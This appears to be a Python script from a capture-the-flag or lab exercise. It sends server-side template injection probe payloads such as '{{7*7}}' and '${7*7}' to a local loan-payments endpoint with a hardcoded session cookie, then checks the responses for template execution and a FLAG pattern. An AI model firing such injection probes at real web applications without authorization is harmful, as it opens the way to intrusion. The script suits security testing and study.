import requests
import json
import re
import time

# Target configuration
target_url = "http://127.0.0.1:32790/total_loan_payments"
session_cookie = "eyJ1c2VyX2lkIjoxfQ.aVlwig.WglbQAOjrshMUOF4GPSXbG8Pe90"

# All 8 bypass techniques from SSTI 101-108
techniques = [
    ("SSTI 101", "{{7*7}}"),
    ("SSTI 102", "${7*7}"),
    ("SSTI 103", "<%=%>"),
    ("SSTI 104", "#{7*7}"),
    ("SSTI 105", "{{7*7}}"),
    ("SSTI 106", "${{7*7}}"),
    ("SSTI 107", "{{7 * 7}}"),
    ("SSTI 108", "[[7*7]]")
]

# Create session with connection pooling
session = requests.Session()
session.headers.update({
    "Content-Type": "application/json",
    "Cookie": f"session={session_cookie}"
})

# Disable keep-alive to prevent broken pipe issues
session.headers.update({"Connection": "close"})

print("SSTI Bypass Testing with 8 Techniques")
print("=" * 60)

results = []
executed_count = 0
blocked_count = 0
json_valid_count = 0

for idx, (test_name, payload) in enumerate(techniques, 1):
    print(f"\n{idx}. {test_name}: {payload}")
    print("-" * 60)
    
    test_data = {"amount": payload, "description": "test"}
    success = False
    
    # Retry logic with exponential backoff
    for attempt in range(3):
        try:
            response = session.post(
                target_url,
                json=test_data,
                timeout=20,
                allow_redirects=False
            )
            success = True
            break
        except requests.exceptions.ConnectionError as e:
            if attempt < 2:
                wait_time = 2 ** attempt
                print(f"  Connection error, retrying in {wait_time}s...")
                time.sleep(wait_time)
            else:
                print(f"  Failed after 3 attempts: {str(e)}")
                results.append({"technique": test_name, "error": str(e)})
                continue
        except Exception as e:
            print(f"  Error: {str(e)}")
            results.append({"technique": test_name, "error": str(e)})
            break
    
    if not success:
        continue
    
    # Extract response details
    status = response.status_code
    response_text = response.text
    content_type = response.headers.get("Content-Type", "")
    
    print(f"  Status Code: {status}")
    print(f"  Content-Type: {content_type}")
    print(f"  Response Length: {len(response_text)} bytes")
    
    # Check for filter indicators
    filter_words = ["forbidden", "blocked", "access denied", "unauthorized", "invalid"]
    blocked = any(word in response_text.lower() for word in filter_words)
    
    if blocked:
        matches = [word for word in filter_words if word in response_text.lower()]
        print(f"  Filter Status: BLOCKED ({', '.join(matches)})")
        blocked_count += 1
    else:
        print(f"  Filter Status: PASS")
    
    # Check for template execution (7*7 = 49)
    executed = False
    if re.search(r'\b49\b', response_text):
        match = re.search(r'\b49\b', response_text)
        context = response_text[max(0, match.start()-30):match.end()+30]
        print(f"  Template Execution: YES")
        print(f"  Context: {context}")
        executed = True
        executed_count += 1
    else:
        print(f"  Template Execution: NO")
    
    # Check JSON validity
    is_json = "application/json" in content_type
    json_valid = False
    if is_json:
        try:
            json_data = json.loads(response_text)
            json_valid = True
            json_valid_count += 1
            print(f"  JSON Valid: YES")
        except:
            print(f"  JSON Valid: NO (content-type mismatch)")
    else:
        print(f"  JSON Valid: NO")
    
    # Store results
    results.append({
        "technique": test_name,
        "payload": payload,
        "status": status,
        "filter_blocked": blocked,
        "template_executed": executed,
        "json_valid": json_valid,
        "response_text": response_text
    })
    
    # Brief response preview
    if len(response_text) > 0:
        preview = response_text[:150] + ("..." if len(response_text) > 150 else "")
        print(f"  Response: {preview}")
    
    # Rate limiting delay
    time.sleep(1)

# Summary
print("\n" + "=" * 60)
print("SUMMARY")
print("=" * 60)
print(f"Techniques Tested: {len(techniques)}")
print(f"Successful Bypasses: {executed_count}")
print(f"Blocked by Filter: {blocked_count}")
print(f"Valid JSON Responses: {json_valid_count}")

bypasses = [r for r in results if not r.get("filter_blocked") and r.get("template_executed")]
if bypasses:
    print(f"\n✓ WORKING BYPASSES: {len(bypasses)}")
    for bp in bypasses:
        print(f"  - {bp['technique']}: Status {bp['status']}")
else:
    print(f"\n✗ NO SUCCESSFUL BYPASSES")

# Flag detection
print("\n" + "=" * 60)
print("FLAG DETECTION")
print("=" * 60)

flag_found = False
for result in results:
    response_text = result.get("response_text", "")
    flag_match = re.search(r'FLAG\{[^}]+\}', response_text)
    if flag_match:
        print(f"[!] FLAG FOUND: {flag_match.group(0)}")
        print(f"    Technique: {result['technique']}")
        flag_found = True

if not flag_found:
    print("[-] No FLAG pattern detected in responses")

print("\nTest complete."), 
